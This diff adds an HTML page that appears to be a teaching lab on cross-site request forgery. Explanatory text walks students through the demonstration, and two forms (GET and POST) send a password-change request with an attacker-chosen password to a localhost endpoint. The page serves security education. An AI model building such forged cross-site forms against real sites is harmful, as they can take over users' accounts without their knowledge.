@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="EN" xml:lang="en">
+  <head>
+    <title>Evil Web Page</title>
+    <style>
+      body {
+        background-image: url("hacker.jpg");
+      }
+    </style>
+  </head>
+  <body>
+    <h1 style="color: #ffffff">Attack Web Page</h1>
+    <br /><br /><br />
+    <img src="csrf-steal.jpg" alt="Steal Cookie" />
+    <p
+      style="
+        font-size: 2vw;
+        color: black;
+        background-color: white;
+        width: 1000px;
+      "
+    >
+      Look at the URL above, and notice where this page was loaded from
+      (scheme+domain), an evil hacker website!! The hacker has created a HTML
+      form that will change the password on the main parent site. Open the
+      debugger and watch the HTTP call and the cookies that are sent. Notice it
+      is cross-site, why? (Hint: look at the scheme and samesite)Thus,
+      Cross-Site Request Forgery. Now Imagine if one of the cookies had session
+      info in it, what do you think would happen?
+      <br /><br />Now click the button below and --- GoodBye Your Account!
+    </p>
+
+    <div
+      style="
+        font-size: 1.5vw;
+        color: black;
+        background-color: white;
+        width: 600px;
+      "
+    >
+      Look what the hacker will set their password to below when you click the
+      button. NOTE: This is sending a HTML Form HTTP Request and NOT a
+      Javascript HTTP Request:
+    </div>
+    <form
+      style="color: #ffffff"
+      method="GET"
+      action="https://localhost:9381/change-password"
+      id="changepwdGETform"
+    >
+      <input
+        style="
+          font-size: 1vw;
+          color: black;
+          background-color: rgb(13, 228, 49);
+          width: 600px;
+        "
+        name="new-password"
+        value="s3t-th1s-t0-hacker-passw0rd"
+        width="600px"
+        disabled
+      />
+    </form>
+    <button
+      id="getjsonbutton"
+      type="submit"
+      form="changepwdGETform"
+      style="height: 50px; width: 200px"
+    >
+      Change Password Button with HTTP GET
+    </button>
+    <form
+      style="color: #ffffff"
+      method="POST"
+      action="https://localhost:9381/change-password"
+      id="changepwdPOSTform"
+    >
+      <input
+        style="
+          font-size: 1vw;
+          color: black;
+          background-color: rgb(13, 228, 49);
+          width: 600px;
+        "
+        name="new-password"
+        value="s3t-th1s-t0-hacker-passw0rd"
+        width="600px"
+        disabled
+      />
+    </form>
+    <button
+      id="getjsonbutton"
+      type="submit"
+      form="changepwdPOSTform"
+      style="height: 50px; width: 200px"
+    >
+      Change Password Button with HTTP POST
+    </button>
+  </body>
+</html>
